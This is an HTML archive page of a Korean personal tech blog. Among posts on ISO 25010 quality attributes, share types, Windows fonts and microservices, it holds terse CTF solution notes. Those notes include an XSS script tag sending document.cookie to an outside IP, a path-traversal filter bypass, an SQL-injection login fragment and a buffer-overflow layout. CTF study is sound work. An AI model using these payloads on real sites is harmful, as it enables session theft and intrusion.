<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="GwangHui Park"><meta name="copyright" content="GwangHui Park"><title>History | Gwang Story</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">GwangHui Park</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">100</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">47</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">12</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gwang Story</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Gwang Story</div><div id="site-sub-title">History</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/16/architect-course-software-quality-attribute/">architect-course-software-quality-attribute</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/architect-course/">architect course</a></span><div class="content"><h3 id="국체-표준-약자"><a class="markdownIt-Anchor" href="#국체-표준-약자"></a> 국체 표준 약자</h3>
<ul>
<li>ISO : International Organization for Standardization, 국제표준화기구</li>
<li>IEC : International Electrotechnical Commission, 국제전기기술위원회</li>
<li>IEEE : Institute of Electrical and Electronics Engineers, 국제전기기술자협회</li>
</ul>
<h3 id="isoiec-9126-isoiec-25010"><a class="markdownIt-Anchor" href="#isoiec-9126-isoiec-25010"></a> ISO/IEC 9126, ISO/IEC 25010</h3>
<ul>
<li>소프트웨어 제품의 품질특성을 정의하고 품질을 평가하기 위한 기준(Metrics)을 정의한 표준</li>
<li>소프트웨어 제품을 사용하는 사용자의 입장에서 어떤 특징을 가진 소프트웨어가 품질이 높은 소프트웨어라 할 수 있는가? 에 대한 관점으로 접근</li>
<li>ISO/IEC 9126 : Software Engineering - Product Quality
<ul>
<li>기능성, 신뢰성, 사용성, 효율성, 유지보수성, 이식성</li>
</ul>
</li>
<li>ISO/IEC 25010 : Systems and software engineering - Systems and software quality requirements and evaluation
<ul>
<li>기능적합성, 신뢰성, 사용성, 실행효율성, 유지보수성, 이식성, 호환성, 보안성</li>
</ul>
</li>
</ul>
<h3 id="제품-품질-특성"><a class="markdownIt-Anchor" href="#제품-품질-특성"></a> 제품 품질 특성</h3>
<p><img src="/images/architect-course/ISO_25010.png" alt="" /></p>
<ul>
<li>기능 적합성 (Functional suitability) : 제품(시스템)이 명시된 조건에서 사용될경우, 명시되거나 암시된 요구를 충족시키는 기능을 제공하는 정도
<ul>
<li>기능 성숙도 (Functional Completeness) : 해당 기능들이 사용자의 모든목적을 만족하는 정도</li>
<li>기능 정확도 (Functional Correctness) : 제품(시스템)이 정밀도의 필요 정도에따라 정확한 결과를 제공하는 정도</li>
<li>기능 타당성 (Functional Appropriateness) : 기능이 명시된 작업 및 목적의 완수를 용이하게 하는 정도</li>
</ul>
</li>
<li>수행 효율성 (Performance efficiency) : 주어진 조건에서 자원의 양에 따른 성능
<ul>
<li>시간반응성(Time Behavior) : 기능을 수행할 때 제품(시스템)의 응답 및 처리시간과 처리율이 요구사항을 충족시키는 정도</li>
<li>자원 활용(Resource Utilization) : 기능을 수행할 때 제품(시스템)에서 사용하는 자원의 유형이나 양이 요구사항을 만족시키는 정도</li>
<li>기억용량 : (Capacity)	제품(시스템파라미터)의 최대 한계가 요구사항을 만족시키는 정도</li>
</ul>
</li>
<li>호환성 (Compatibility) : 다른 제품과 함께 동일한 SW(HW)  환경을 공유하면서 필요한 기능을 수행할 수 있는 정도
<ul>
<li>상호 공존성(Co-existence) : 제품(시스템)이 다른 제품(시스템)에 유해를 가하지 않고 일반적인 환경 및 자원을 공유하면서 제품에 요구된 기능을 효과적으로 수행할 수 있는 정도</li>
<li>상호 운용성(Interoperability) : 둘 이상의 제품(시스템, 구성요소)이 서로 정보를 교환하거나 교환한 정보를 사용할 수 있는 정도</li>
</ul>
</li>
<li>사용성 (Usability) : 명시된 사용 환경에서 제품(시스템)이 사용자에 의해 유효성, 효율성 및 만족의 목적을 달성하는 정도
<ul>
<li>타당성 식별력(Appropriateness Recognizability) : 제품(시스템)의 기능이 사용자의 요구에 적절한지 여부를 식별할 수 있는 정도</li>
<li>학습성(Learnability) : 사용자가 제품(시스템)의 목적에 맞게 사용 방법을 학습하여 사용할 수 있는 정도</li>
<li>운용성(Operability) : 제품(시스템)을 제어하거나 동작하는 것을 쉽게 할 수 있는 정도</li>
<li>사용자 오류보호(User error Protection) : 발생한 오류로부터 시스템이 사용자를 보호하는 정도</li>
<li>사용자 인터페이스 미학(User Interface Aesthetics) : 사용자 인터페이스가 사용자와의 상호작용에서 유쾌하고 만족스러울수 있는 정도</li>
<li>접근성(Accessibility) : 지정한 상황에서 제품(시스템)이 다양한 특성을 가진(연령/장애) 사람에의해 명시된 목표를 달성하며 사용할 수 있는 정도</li>
</ul>
</li>
<li>신뢰성 (Reliability) : 제품(시스템, 구성요소)이 명시된 기간과 조건하에서 명시된 기능을 유지하는 정도
<ul>
<li>성숙도 (Maturity) : 제품(시스템, 구성요소)이 표준 환경에서 고장을 회피하며 신뢰도를 충족시키는 정도</li>
<li>가용성 (Availability) : 제품(시스템, 구성요소)을 사용할 필요가 있을 때 사용하거나 접근할 수 있는 정도</li>
<li>오류 허용성 (Fault Tolerance) : 제품(시스템, 구성요소)에 SW(HW)  결함이 존재해도 의도한 성능 수준을 유지할 수 있는 정도</li>
<li>회복 가능성 (Recoverbility) : 고장이 발생하였을 때 제품(시스템)이 직접 원하는 성능 수준으로 회복하며 데이터를 복구할 수 있는 정도</li>
</ul>
</li>
<li>보안(Security) : 제품(시스템)이 정보(데이터를) 보호하는 정도
<ul>
<li>기밀성 (Confidentiality) : 제품(시스템)이 접근 허가된 권한만 있는 다른 제품(시스템)만 접근할 수 있게 하는 정도</li>
<li>무결성 (Integrity) : 제품(시스템, 구성요소)이 컴퓨터 프로그램 혹은 데이터를 무단으로 접근(변경)하는것을 방지하는 정도</li>
<li>부인방지 (Non-repudiation) : 사건(행동)이 발생한 뒤 그 사실을 거부할 수 없도록 사건(행동)에 대해 입증하는 정도</li>
<li>책임성 (Accountability) : 사용자의 행동을 고유하게 식별하여 그 사용자의 행동을 추정할 수 있는 정도</li>
<li>인증성 (Authenticity) : 사건 및 행동에 대해 주체임을 증명할 수 있는 능력</li>
</ul>
</li>
<li>유지보수성(Maintainability) : 제품(시스템)을 효과적이고 효율적으로 의도된대로 변경할 수 있는 정도
<ul>
<li>모듈성 (Modularity) : 외부에 대하여 최소의 영향을 가진 개별 구성 요소로 시스템(SW)이 구성된 정도</li>
<li>재사용성 (Reusability) : 자산(모듈)이 한 개 이상의 시스템에서 사용될 수 있거나, 다른 자산에 구축할 수 있는 정도</li>
<li>분석성 (Analyzability) : 제품(시스템)의 문제를 식별하고, 고장의 원인을 진단하고 변경사항을 반영하기 위하여 수정하여야 하는 부분을 식별하기 쉬운 정도</li>
<li>수정 가능성 (Modifiability) : 제품(시스템)을 수정할때, 기존 제품의 품질을 저하시키거나 장애를 발생시키지 않으면서 효과적이고 효율적으로 수정할 수 있는 정도</li>
<li>시험 가능성 (Testability) : 제품(시스템, 구성요소)을 검증한 근거가 충분한지를 확인할 수 있는 정도</li>
</ul>
</li>
<li>이식성 (Portability) : 제품(시스템, 구성요소)이 다른 다양한 환경(SW/HW/Network) 등으로의 전환이 용이한 정도
<ul>
<li>적합성 (Adaptability) : 제품(시스템)을 다른 SW(HW)나 사용환경에 효과적이고 효율적으로 적용할 수 있는 정도</li>
<li>설치 가능성 (Installability) : 제품(시스템)이 성공적으로 설치/제거될 수 있는 정도</li>
<li>대치성 (Replaceability) : 제품이 동일한 환경에서 동일한 목적을 위해 다른 지정된 SW 제품으로 대체될 수 있는 정도</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>characteristic</th>
<th>definition</th>
</tr>
</thead>
<tbody>
<tr>
<td>기능적합성</td>
<td>제품 혹은 시스템이 명시된 조건에서 사용될 경우 명시되거나 암시된 요구를 충족시키는 기능을 제공하는 정도</td>
</tr>
<tr>
<td>수행 효율성</td>
<td>규정된 조건 하에 사용된 자원의 크기에 대한 상대적 성능</td>
</tr>
<tr>
<td>호환성</td>
<td>같은 하드웨어 혹은 SW 환경을 공유하는 동안 기타 제품,시스템 혹은 구성요소를 교환할 수 있고/혹은 요구된 기능을 구성할 수 있는 정도</td>
</tr>
<tr>
<td>유용성</td>
<td>제품 및 시스템이 명시된 사용 환경에서 유효성, 효율성 및 만족의 명시된 목적을 달성하는 명시된 사용자에 인해 사용될 수 있는 정도</td>
</tr>
<tr>
<td>신뢰성</td>
<td>시스템, 제품 혹은 구성요소가 시간이 명시된 기간에 대해 명시된 조건 하에서 명시된 기능을 구성하는 정도</td>
</tr>
<tr>
<td>보안</td>
<td>제품 혹은 시스템은 정보 및 데이터를 보호한다. 그래서 사람 혹은 기타 제품 혹은 시스템이 자신의 유형 및 인증 정도에 적절한 데이터 접근의 정도를 가지고 있다</td>
</tr>
<tr>
<td>유지관리성</td>
<td>제품 혹은 시스템의 유효성이 유지관리자로 인해 변경될 수 있는 정도</td>
</tr>
<tr>
<td>이동성</td>
<td>시스템, 제품 혹은 구성요소는 하드웨어, SW 혹은 기타 운영 혹은 다른 하나의 사용 환경으로 전환될 수 있는 유효성 및 효율성의 정도</td>
</tr>
</tbody>
</table>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/10/ctf_solution2020/">ctf_solution2020</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-10</time><div class="content"><h2 id="reverse-engineering"><a class="markdownIt-Anchor" href="#reverse-engineering"></a> reverse engineering</h2>
<h2 id="forensic"><a class="markdownIt-Anchor" href="#forensic"></a> forensic</h2>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2>
<h2 id="network"><a class="markdownIt-Anchor" href="#network"></a> network</h2>
<h2 id="information-hiding"><a class="markdownIt-Anchor" href="#information-hiding"></a> information hiding</h2>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h2>
<h3 id="솔로몬의-저울"><a class="markdownIt-Anchor" href="#솔로몬의-저울"></a> 솔로몬의 저울</h3>
<ul>
<li>fastcoll : 해쉬 충돌을 통해 서로 다른 2개의 파일의 md5 해쉬값을 똑같이 만들 수 있다.</li>
</ul>
<p>서로 다른 2개의 파일에서 같은 해쉬 값을 얻을수 있다.</p>
<h3 id="라이언-일병-구하기-2"><a class="markdownIt-Anchor" href="#라이언-일병-구하기-2"></a> 라이언 일병 구하기 2</h3>
<ul>
<li>information hiding</li>
<li>Hex to JPG</li>
<li>base64 Decode</li>
<li>MZ는 실행파일</li>
<li>기드라로</li>
<li><a href="http://virustotal.com" target="_blank" rel="noopener">virustotal.com</a> :</li>
<li>base64 decoding</li>
</ul>
<h3 id="화면-조정시간"><a class="markdownIt-Anchor" href="#화면-조정시간"></a> 화면 조정시간</h3>
<ul>
<li>file view lite</li>
<li>stegsolve</li>
<li>8초쯤</li>
</ul>
<h3 id="비둘기-게임-시즌-2-1"><a class="markdownIt-Anchor" href="#비둘기-게임-시즌-2-1"></a> 비둘기 게임 시즌 2-1</h3>
<ul>
<li>소켓통신</li>
<li>40자리, 알파벳 대문자, 숫자</li>
<li>python -_-;;</li>
<li>걍 던져라</li>
</ul>
<h3 id="capture-the-flag"><a class="markdownIt-Anchor" href="#capture-the-flag"></a> Capture the Flag!!!</h3>
<ul>
<li>Hex Editor</li>
<li>Fake Lock</li>
<li>암호화된 파일은 Hex 21</li>
<li><a href="http://1993-constant.tistory.com" target="_blank" rel="noopener">1993-constant.tistory.com</a></li>
</ul>
<h3 id="게시글-댓글-찾기-1"><a class="markdownIt-Anchor" href="#게시글-댓글-찾기-1"></a> 게시글 댓글 찾기 -1</h3>
<ul>
<li>querystring</li>
<li>masterseq, boardSeq = 5에서 찾음</li>
<li>masterseq = 7 에서 찾을수 있었음</li>
</ul>
<h3 id="라이언-일병-구하기"><a class="markdownIt-Anchor" href="#라이언-일병-구하기"></a> 라이언 일병 구하기</h3>
<ul>
<li>Crypto</li>
<li>Enigma 해독</li>
<li>Enigma 해독 알고리즘</li>
</ul>
<h3 id="tardis"><a class="markdownIt-Anchor" href="#tardis"></a> Tardis</h3>
<ul>
<li>forensics</li>
<li>AccessData FTK Imager</li>
<li>Hex Editor</li>
<li>Base64 encoding, Decoding</li>
<li>Tardis Connector_1, magic number 4D 5A</li>
<li>hex editor로 2개 파일 연결</li>
<li>Ghidra exe파일 디컴파일</li>
<li>16진수로 저장된 비밀번호를 ASCII로 변환한걸 확인</li>
<li>리틀 인디안</li>
</ul>
<h3 id="나르코스"><a class="markdownIt-Anchor" href="#나르코스"></a> 나르코스</h3>
<ul>
<li>information hiding</li>
<li>ZIP Magic Number 50 5b 03 04 복사</li>
<li>찍은 날짜</li>
<li>스트링이 QR Code</li>
<li><a href="https://hahamas10.github.io/binary-to-qrcode" target="_blank" rel="noopener">https://hahamas10.github.io/binary-to-qrcode</a></li>
<li>Barcapture</li>
</ul>
<h3 id="집무실-청소-1"><a class="markdownIt-Anchor" href="#집무실-청소-1"></a> 집무실 청소 -1</h3>
<ul>
<li>파일 카빙, hex editor</li>
<li>파일명이 user7.jpg</li>
<li>suspiciousfile.txt</li>
<li>49 46 매직 넘버</li>
<li>ZIP으로 변경</li>
</ul>
<h3 id="퍼즐-게임-level-1"><a class="markdownIt-Anchor" href="#퍼즐-게임-level-1"></a> 퍼즐 게임 level 1</h3>
<ul>
<li>AES 128, ECB Decryption</li>
<li>분기처리를 보면 힌트</li>
<li>암호화된 텍스트와 암호화 방식을 확인할 수 있다.</li>
<li>puzzle1 , key</li>
</ul>
<h3 id="wallpaper-downloader"><a class="markdownIt-Anchor" href="#wallpaper-downloader"></a> Wallpaper Downloader</h3>
<ul>
<li>File Traversal</li>
<li>preg_match bypass</li>
<li>parameter filter</li>
<li>response header php</li>
<li>transaction.php 파일 다운로드</li>
<li>파라미터 필터 로직, i플래그가 없으면 대소문자 구분한다</li>
<li>wallPaper.jpg 같이 p 한 단어만 대문자로 만들어도</li>
<li>…/…/…/…/…/SDS/goooooooodluck_DevHack/flag</li>
</ul>
<h3 id="패스워드-찾기"><a class="markdownIt-Anchor" href="#패스워드-찾기"></a> 패스워드 찾기</h3>
<ul>
<li>로그인 찾기</li>
<li>모든 게시물 조회 후 소스 보기를 통해 로그인 접속 정보 확인</li>
<li>소스보기로 주석이 써있었다</li>
<li>암호화된 패스워드 리스트</li>
<li>Content 길이가 MD5</li>
<li>MD5 rainbow table MD5 decrypt</li>
<li>SQL Injection 시도 로그인 # and 1=1 and</li>
<li><a href="http://md5decrypt.net" target="_blank" rel="noopener">md5decrypt.net</a></li>
</ul>
<h3 id="관리자의-쿠키를-훔쳐라"><a class="markdownIt-Anchor" href="#관리자의-쿠키를-훔쳐라"></a> 관리자의 쿠키를 훔쳐라</h3>
<ul>
<li>서버로 가기전 lt, gt 형태로 치환되는것을 확인</li>
<li>자바스크립트로 치환하는 것을 확인</li>
<li>burp suite</li>
<li>쿠키를 획득할 수 있는 스크립트를 URI_Encoding</li>
<li>
<script>document.location='http://182.195.92.204:8080/~+document.cookie </script>
</li>
</ul>
<h3 id="관리자의-쿠키를-또-훔쳐라"><a class="markdownIt-Anchor" href="#관리자의-쿠키를-또-훔쳐라"></a> 관리자의 쿠키를 또!! 훔쳐라</h3>
<ul>
<li>Request에서는 입력한 값 그대로인 것을 확인</li>
<li>&lt;<script>&gt;~~</script></li>
</ul>
<h3 id="the-water-world"><a class="markdownIt-Anchor" href="#the-water-world"></a> The Water world</h3>
<ul>
<li>PDF파일 포멧을 보면 &lt;Type/ExtGState&gt; 0.1096 -&gt; 0.0196</li>
<li>Key is ‘a_whole_new_world’</li>
</ul>
<h3 id="catch-me-if-you-can"><a class="markdownIt-Anchor" href="#catch-me-if-you-can"></a> Catch me if you can</h3>
<ul>
<li>DNS_covert_channel</li>
<li>FTP message.xlsx</li>
<li>UDP, 작은 거</li>
</ul>
<h3 id="have-i-been-pwned"><a class="markdownIt-Anchor" href="#have-i-been-pwned"></a> Have I been pwned?</h3>
<ul>
<li>Reverse Engineering</li>
<li>buffer overflow</li>
<li>Buf[4] AAAA</li>
<li>ESP    BBBB</li>
<li>EBP    CCCC + GccDummy[4]</li>
<li>RET    Attack ADdr</li>
<li>/x06/x15/x40</li>
</ul>
<h3 id="secret-agent"><a class="markdownIt-Anchor" href="#secret-agent"></a> Secret Agent</h3>
<ul>
<li>2021년</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/09/startup-stock-type/">startup-stock-type</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/stock/">stock</a></span><div class="content"><h2 id="ps-preference-shares-우선주"><a class="markdownIt-Anchor" href="#ps-preference-shares-우선주"></a> PS (Preference Shares 우선주)</h2>
<ul>
<li>보통주보다 재산적 내용(이익, 이자배당, 잔여 재산 분배 등)에 있어서 우선적인 지위가 인정</li>
<li>보통주의 기본적 특성인 의결권을 포기</li>
<li>경영 참가 의사가 없고 배당 등 자산 소득에 관심이 높은 개인 투자자들 대상으로 발행</li>
</ul>
<h2 id="cps-convertible-preferred-stock-전환-우선주"><a class="markdownIt-Anchor" href="#cps-convertible-preferred-stock-전환-우선주"></a> CPS (Convertible Preferred Stock 전환 우선주)</h2>
<ul>
<li>우선주의 형태로 발행 후 일정기간이 지난 후 보통주로 전환할 수 있는 권리</li>
<li>전체 우선주의 25% 범위 내에서 발행 가능</li>
<li>특정 세력의 적대적 M&amp;A 시도가 있을 경우 기존 우호주주에게 우선 배정해 경영안정을 도모하기도 함</li>
<li></li>
</ul>
<h2 id="rps-redeemable-preferred-stock-상환-우선주"><a class="markdownIt-Anchor" href="#rps-redeemable-preferred-stock-상환-우선주"></a> RPS (Redeemable preferred Stock 상환 우선주)</h2>
<ul>
<li>특정 기간 동안 우선주의 성격을 가지고 있다가 기간이 만료되면 발행회사에서 다시 주식을 되사가는 주식</li>
<li>상환을 전제로 발행하기 때문에 만기 존재, 발행회사는 만기에 되사서 반드시 소각해야 함</li>
<li>상환의 결정은 회사 측에서 일방적으로 이루어질 수도 있고, 주주의 청구에 의하여 이루어질 수도 있다.</li>
<li></li>
</ul>
<h2 id="rcps-redeemable-convertible-preferred-stock-상환-전환-우선주"><a class="markdownIt-Anchor" href="#rcps-redeemable-convertible-preferred-stock-상환-전환-우선주"></a> RCPS (Redeemable Convertible preferred Stock 상환 전환 우선주)</h2>
<ul>
<li>만기 때 투자금을 상환 받을 수 있는 상환권, 우선주를 보통주로 전활할 수 있는 전환권, 잔여재산이나 매각대금에 분배해 우선하는 권리를 가지는 우선권을 모두 가지고 있는 주식이다.</li>
<li>IFRS 상으로 부채로 분류되지만 회사가 상환권을 가지면 자본으로 인정받을 수 있으며, RCPS를 CPS로 전환해 자본 안정성을 높일 수 있다.</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/07/window-font/">window-font</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-07</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/font/">font</a></span><div class="content"><h2 id="window-폰트-바꾸기"><a class="markdownIt-Anchor" href="#window-폰트-바꾸기"></a> Window 폰트 바꾸기</h2>
<h3 id="네이버에서-폰트-다운로드"><a class="markdownIt-Anchor" href="#네이버에서-폰트-다운로드"></a> 네이버에서 폰트 다운로드</h3>
<ul>
<li><a href="http://hangeul.naver.com/2016/nanum" target="_blank" rel="noopener">네이버폰트</a></li>
</ul>
<h3 id="설정"><a class="markdownIt-Anchor" href="#설정"></a> 설정</h3>
<h4 id="가"><a class="markdownIt-Anchor" href="#가"></a> 가</h4>
<ul>
<li>레지스트리 편집기 실행 (Win + R키 (실행) ☞ regedit)</li>
<li>‘HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts’ 경로로 들어가서</li>
<li>Batang &amp; BatangChe &amp; Gungsuh &amp; GungsuhChe (TrueType) 더블 클릭후, batang.ttc 값 지우고 공란으로 놔둔다.</li>
<li>Gulim &amp; GulimChe &amp; Dotum &amp; DotumChe (TrueType) 더블 클릭후, gulim.ttc 값 지우고 공란으로 놔둔다.</li>
</ul>
<h4 id="나"><a class="markdownIt-Anchor" href="#나"></a> 나</h4>
<ul>
<li>레지스트리 편집기 실행 (Win + R키 (실행) ☞ regedit)</li>
<li>‘HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontSubstitutes’ 경로로 들어가셔서</li>
<li>마우스 우클릭 ☞ 새로 만들기 ☞ 문자열 값 입력 후 ☞ 더블클릭으로 실행</li>
<li>값 이름에 Gulim, 값데이터에 “나눔바른고딕” 넣어 만들어줍니다.</li>
<li>“Gulim” = “나눔바른고딕”</li>
<li>“Dotum”=“나눔바른고딕”</li>
<li>“Batang”=“나눔명조”</li>
<li>“Gungsuh”=“나눔명조”</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/21/reactive-spring-01/">reactive-spring-01</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-21</time><div class="content"><h2 id="webflux"><a class="markdownIt-Anchor" href="#webflux"></a> Webflux</h2>
<ul>
<li>It is fully non-blocking, supports Reactive Streams back pressure,<br />
and runs on such servers as Netty, Undertow, and Servlet 3.1+ containers.</li>
</ul>
<h3 id="reactive-stream"><a class="markdownIt-Anchor" href="#reactive-stream"></a> Reactive Stream</h3>
<ul>
<li>스트림 프로세싱을 비동기로 처리할 수 있는 표준안 제공</li>
</ul>
<h3 id="rxjava"><a class="markdownIt-Anchor" href="#rxjava"></a> Rxjava</h3>
<ul>
<li>비동기 및 이벤트 기반 프로그램을 구성하기 위한 Reactive Extension의 구현체</li>
<li>데이터/이벤트의 시퀀스를 지원 하도록 관찰자 패턴 을 확장하고 low-level threading, 동기화,<br />
thread-safety 및 동시성을 가지는 데이터 구조와 같은 문제를 추상화하면서 선언적으로 시퀀스를 함께 구성할 수 있는 연산자를 추가</li>
<li>Reactive Stream Dependency</li>
</ul>
<p><a href="https://github.com/ReactiveX/RxJava/wiki" target="_blank" rel="noopener">https://github.com/ReactiveX/RxJava/wiki</a></p>
<h3 id="coroutine-vs-rxjava"><a class="markdownIt-Anchor" href="#coroutine-vs-rxjava"></a> Coroutine vs Rxjava</h3>
<ul>
<li><a href="https://thdev.tech/kotlin/2018/11/07/RxJava-To-Kotlin-Coroutine/" target="_blank" rel="noopener">https://thdev.tech/kotlin/2018/11/07/RxJava-To-Kotlin-Coroutine/</a></li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/28/event-driven-microservice-buliding/">event-driven-microservice-buliding</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-28</time><div class="content"><h2 id="데이터-해방"><a class="markdownIt-Anchor" href="#데이터-해방"></a> 데이터 해방</h2>
<h3 id="쿼리-기반"><a class="markdownIt-Anchor" href="#쿼리-기반"></a> 쿼리 기반</h3>
<ul>
<li>벌크 로딩
<ul>
<li>벌크 쿼리를 실행해서 전체 데이터를 로드합니다. 앞으로 계속할 증분 업데이트를 하기 직전, 그리고 각 폴링 주기마다 전체 테이블을 로드할 경우에 수행하는 작업</li>
<li>대량 데이터의 경우 비용이 많이 들고 구현체마다 성능 편차가 심하므로 조심</li>
</ul>
</li>
<li>증분 타임스탬프 로딩
<ul>
<li>이전 쿼리 결과의 최정 타임 스탬프 이후에 쌓인 데이터를 쿼리해 적재</li>
<li>최근 업데이트 시간 컬럼/필드를 기준으로 레코드가 가장 마지막에 수정된 시간을 찾아 매번 증분 업데이트할 때마다 최종 수정시간 컬럼/필드가 이 시간 이후인 레코드만 가져옴</li>
</ul>
</li>
<li>자동증가 ID 로딩
<ul>
<li>증분 업데이트를 할 때마다 ID 값이 마지막으로 처리한 ID 보다 큰 데이터만 쿼리해서 적재</li>
</ul>
</li>
<li>맞춤 쿼리
<ul>
<li>클라이언트 쿼리 언어로 제한</li>
<li>대용량 데이터 중 일부만 필요하거나 내부 데이터 모델이 과도하게 노출되는 것을 막기 위해 여러 테이블의 데이터를 조인하고 반정규화 할때 이런 맞춤 쿼리를 사용함</li>
</ul>
</li>
<li>증분 업데이트
<ul>
<li>데이터 세트의 레코드에 필요한 타임스탬프나 자동 증가 ID를 생성하고 쿼리가 아직 처리하지 않은 레코드에서 이미 처리한 레코드를 필터링하려면 필요</li>
<li>최근 업데이트 시간 컬럼이나 자동증가 ID가 없다면 데이터 저장소가 알아서 추가해서 채우도록 설정</li>
<li>경합 조건(race condition)이 생기지 않도록 폴링 빈도와 업데이트 지연 시간을 정하고 마지막으로 벌크로드 1회 후 업데이트</li>
</ul>
</li>
<li>장점
<ul>
<li>맞춤성(customizability) : 모든 데이터 저장소를 쿼리할 수 있고 클라이언트가 마음껏 쿼리 옵션을 지정 가능</li>
<li>독립적인 폴링 주기 : SLA가 엄격한 쿼리는 실행 빈도를 높이고 그밖에 비용이 많이는 나머지 쿼리는 빈도를 낮춤</li>
<li>내부 데이터 모델의 격리 : 관계형 DB에서는 구체화 뷰(materialized view) 또는 뷰(view) 객체를 이용해 내부 데이터 모델과 분리할 수 있음</li>
</ul>
</li>
<li>단점
<ul>
<li>최종 업데이트 시간 타임스탬프가 필수 : 데이터가 마지막으로 업데이트된 시간에 따라 증분 업데이트를 하는 방식이라 필수</li>
<li>하드 삭제(hard deletion) 추적 불가 : 삭제를 추적하려면 플래그 기반의 소프트 삭제만 가능</li>
<li>데이터 스키마, 출력 이벤트 스키마 간 취약한 의존 관계 : 다운 스트림 이벤트 포멧의 스키마 규칙과 호환되지 않는 방향으로 데이터 세트 스키마가 변경될 가능성이 항상 존재</li>
<li>간헐적 캡처(intermittent capture) : 데이터가 일정한 폴링 주기마다 동기화되기 때문에 동일한 레코드에 대한 일련의 변경들은 각자 개별적인 이벤트로만 보임</li>
<li>생산 리소스 낭비 : 쿼리를 실행하려면 하부 시스템의 리소스를 사용해야 하므로 생산 시스템의 지연 시간이 너무 커질 수 있음</li>
<li>데이터 변경 때문에 쿼리 성능이 오르락내리락함 : 데이터 변경 규모에 따라 변환 데이터량이 변해 최악의 경우, 전체 데이터가 계속 변경되어 현재 쿼리가 전부 처리 되기 전에 다음 쿼리가 요청되는 경합조건이 발생할 수 있음</li>
</ul>
</li>
</ul>
<h3 id="로그-기반"><a class="markdownIt-Anchor" href="#로그-기반"></a> 로그 기반</h3>
<ul>
<li>WAL(write ahead log) 사용
<ul>
<li>시간 경과에 따라 데이터 세트에 발생한 모든 일을 붙임 전용 로그 형태로 남기는 것</li>
<li>최초 기존 데이터의 스냅샷을 찍고 이후 changelog에서 이벤트를 캡처하여 전송</li>
</ul>
</li>
<li>장점
<ul>
<li>삭제 추적 : 바이너리 로그에는 하드 레코드 삭제가 이미 포함되어 있기 때문에 소프트 삭제 없이 삭제 이벤트로 변환</li>
<li>데이터 저장소 성능에 미치는 영향 최소화 : 선행기입로그를 사용하는 데이터 저장소에는 성능에 별 영향없이 CDC(change data capture) 작업 수행 가능</li>
<li>저지연 업데이트(low-latency updates) : 이벤트가 선행 기입 로그, 바이너리 로그에 기록되면 곧바로 업데이트를 전파할 수 있으므로 다른 데이터 해방 패턴보다 지연시간이 짧음</li>
</ul>
</li>
<li>단점
<ul>
<li>내부 데이터 모델 노출 : 내부 데이터 모델이 체인지로그에 완전히 노출되기 때문에 신중하게 선별해 격리해야 함</li>
<li>데이터 저장소 외부에서 반정규화 :</li>
</ul>
</li>
</ul>
<h3 id="테이블-기반"><a class="markdownIt-Anchor" href="#테이블-기반"></a> 테이블 기반</h3>
